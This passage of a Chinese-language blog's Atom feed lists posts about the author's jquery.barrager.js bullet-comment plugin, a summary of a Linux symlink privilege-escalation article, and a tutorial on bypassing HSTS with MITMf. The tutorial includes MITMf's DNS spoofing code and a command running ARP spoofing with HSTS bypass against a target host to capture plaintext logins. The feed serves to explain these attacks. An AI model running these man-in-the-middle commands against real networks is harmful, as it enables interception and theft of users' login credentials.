rel="noopener">http://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html</a></li><li><a href="http://xteam.baidu.com/?p=175" target="_blank" rel="noopener">http://xteam.baidu.com/?p=175</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;linux以强大的文件管理系统著称，在实际使用中，虽然能为工作提供极大便利，然而如果权限处理不当，可能会造成一定的安全风险，如在操作文件时，会改变某些文件夹的权限，当利用一些可以随意穿越的符号链接时，可以使相应文件指向系统文件，越权修改系统文件权限，攻击者利用此原理，劫持so库，或修改启动定时脚本，从而提权。&lt;/p&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js hexo 集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-hexo.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-hexo.html</id>
    <published>2016-04-24T22:44:09.000Z</published>
    <updated>2018-05-08T12:42:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>网页弹幕插件 jquery.barrager.js hexo 集成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网页弹幕插件 jquery.barrager.js hexo 集成&lt;/p&gt;

      
    
    </summary>
    
      <category term="Yaseng" scheme="http://yaseng.org/categories/Yaseng/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
      <category term="jQuery 弹幕插件" scheme="http://yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
    
      <category term="hexo 弹幕" scheme="http://yaseng.org/tags/hexo-%E5%BC%B9%E5%B9%95/"/>
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js WordPress集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-wordpress.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-wordpress.html</id>
    <published>2016-04-24T22:40:31.000Z</published>
    <updated>2018-05-08T12:42:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>jquery.barrager.js WordPress集成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;jquery.barrager.js WordPress集成&lt;/p&gt;

      
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
      <category term="jQuery 弹幕插件" scheme="http://yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
    
      <category term="WordPress 插件" scheme="http://yaseng.org/tags/WordPress-%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Jquery.barrager.js  1.0 专业的网页弹幕插件</title>
    <link href="http://yaseng.org/jquery-barrager-js-1-0.html"/>
    <id>http://yaseng.org/jquery-barrager-js-1-0.html</id>
    <published>2016-04-24T22:39:15.000Z</published>
    <updated>2018-05-08T12:41:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>名称    jquery.barrager.js<br>版本    1.0<br>项目主页    <a href="http://yaseng.github.io/jquery.barrager.js" target="_blank" rel="noopener">http://yaseng.github.io/jquery.barrager.js</a><br>下载    <a href="https://github.com/yaseng/jquery.barrager.js" target="_blank" rel="noopener">https://github.com/yaseng/jquery.barrager.js</a><br>github    <a href="https://github.com/yaseng/jquery.barrager.js" target="_blank" rel="noopener">https://github.com/yaseng/jquery.barrager.js</a><br>Jquery.barrager.js 是一款优雅的网页弹幕插件、支持显示图片、文字以及超链接。支持速度、高度、颜色、数量等自定义。能轻松集成到论坛,博客等网站中。为网站带来更多的趣味和互动性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;名称    jquery.barrager.js&lt;br&gt;版本    1.0&lt;br&gt;项目主页    &lt;a href=&quot;http://yaseng.github.io/jquery.barrager.js&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http
      
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
  </entry>
  
  <entry>
    <title>网页弹幕插件 jquery.barrager.js  Discuz 集成</title>
    <link href="http://yaseng.org/jquery-barrager-js-for-discuz.html"/>
    <id>http://yaseng.org/jquery-barrager-js-for-discuz.html</id>
    <published>2016-04-24T22:36:33.000Z</published>
    <updated>2018-05-08T12:42:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>discuz 弹幕插件是一款基于discuz 论坛专业的弹幕插件,使用弹幕显示帖子,回复,指定内容等,为论坛带来更多的趣味和互动性。支持速度、高度、颜色、数量等自定义,兼容各种主流浏览器 。<br>插件地址:  <a href="http://addon.discuz.com/?@uauc_barrager.plugin" title="http://addon.discuz.com/?@uauc_barrager.plugin" target="_blank" rel="noopener">http://addon.discuz.com/?@uauc_barrager.plugin</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;discuz 弹幕插件是一款基于discuz 论坛专业的弹幕插件,使用弹幕显示帖子,回复,指定内容等,为论坛带来更多的趣味和互动性。支持速度、高度、颜色、数量等自定义,兼容各种主流浏览器 。&lt;br&gt;插件地址:  &lt;a href=&quot;http://addon.discuz.co
      
    
    </summary>
    
      <category term="Yaseng" scheme="http://yaseng.org/categories/Yaseng/"/>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/Yaseng/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="discuz 插件" scheme="http://yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
    
      <category term="jquery.barrager.js" scheme="http://yaseng.org/tags/jquery-barrager-js/"/>
    
      <category term="网页弹幕" scheme="http://yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
    
  </entry>
  
  <entry>
    <title>使用mitmf 来绕过HSTS站点抓取登陆明文</title>
    <link href="http://yaseng.org/hsts-bypass-with-mitmf.html"/>
    <id>http://yaseng.org/hsts-bypass-with-mitmf.html</id>
    <published>2016-04-17T00:15:54.000Z</published>
    <updated>2018-05-08T12:38:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="HSTS简介"><a href="#HSTS简介" class="headerlink" title="HSTS简介"></a>HSTS简介</h3><p>HSTS是HTTP Strict Transport Security的缩写，即：”HTTP严格安全传输”。当浏览器第一次访问一个HSTS站点,会跳转到https页面,并种植hsts,下次再访问此站时,只要HSTS 还在有效期中,浏览器就会响应一个 HTTP 307 头,在不经过网络请求直接本地强制http跳转到https。这样可以有效防止基于SSLStrip的中间人攻击,对于伪造的证书，会显示错误，并且不允许用户忽略警告。<br><a id="more"></a><br>一个hsts 站点响应的例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  lab  curl  -I   www.taobao.com</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: Tengine</span><br><span class="line">Date: Tue, 12 Apr 2016 06:18:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 258</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: https://www.taobao.com/</span><br><span class="line">Set-Cookie: thw=cn; Path=/; Domain=.taobao.com; Expires=Wed, 12-Apr-17 06:18:30 GMT;</span><br><span class="line">Strict-Transport-Security: max-age=31536000</span><br></pre></td></tr></table></figure></p><!--more--><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="mitmf-原理"><a href="#mitmf-原理" class="headerlink" title="mitmf 原理"></a>mitmf 原理</h4><p>用户首次访问某网站是不受HSTS保护的。这是因为首次访问时，浏览器还未收到HSTS，此时可以劫持站点绕过hsts 。<br>mitmf 就是利用这个缺陷绕过,当用户首次访问时,通过dns2proxy 伪造出一个具体迷惑性的http站点,例如 访问 www.taobao.com  跳转到 wwww.taobao.com 或者 访问login.taobao.com 跳转到 weblogin.taobao.com 。<br>具体代码  <a href="https://github.com/byt3bl33d3r/MITMf/blob/master/core/servers/DNS.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf/blob/master/core/servers/DNS.py</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if hsts:</span><br><span class="line">    if qname in hstsconfig:</span><br><span class="line">        response = self.hstsbypass(hstsconfig[qname], qname, nameservers, d)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    elif qname[:4] == &apos;wwww&apos;:</span><br><span class="line">        response = self.hstsbypass(qname[1:], qname, nameservers, d)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    elif qname[:3] == &apos;web&apos;:</span><br><span class="line">        response = self.hstsbypass(qname[3:], qname, nameservers, d)</span><br><span class="line">        return response</span><br></pre></td></tr></table></figure></p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>kali执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install  mitmf</span><br><span class="line">mitmf -i eth0 --spoof --arp   --hsts --gateway   10.211.55.1  --targets   10.211.55.4</span><br></pre></td></tr></table></figure></p><p>ubuntu 打开 www.xxxx.com<br>效果<br><a href="/uploads/2016/04/hsts_bypass.jpg"><img src="/uploads/2016/04/hsts_bypass-300x85.jpg" alt="" title="hsts_bypass"></a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>MITMf   <a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;HSTS简介&quot;&gt;&lt;a href=&quot;#HSTS简介&quot; class=&quot;headerlink&quot; title=&quot;HSTS简介&quot;&gt;&lt;/a&gt;HSTS简介&lt;/h3&gt;&lt;p&gt;HSTS是HTTP Strict Transport Security的缩写，即：”HTTP严格安全传输”。当浏览器第一次访问一个HSTS站点,会跳转到https页面,并种植hsts,下次再访问此站时,只要HSTS 还在有效期中,浏览器就会响应一个 HTTP 307 头,在不经过网络请求直接本地强制http跳转到https。这样可以有效防止基于SSLStrip的中间人攻击,对于伪造的证书，会显示错误，并且不允许用户忽略警告。&lt;br&gt;
    
    </summary>
    
      <category term="技术文章" scheme="http://yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="hsts" scheme="http://yaseng.org/tags/hsts/"/>
    
      <category term="hsts bypass" scheme="http://yaseng.org/tags/hsts-bypass/"/>
    
      <category term="mitmf" scheme="http://yaseng.org/tags/mitmf/"/>
    
      <category term="中间人攻击" scheme="http://yaseng.org/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
</feed>
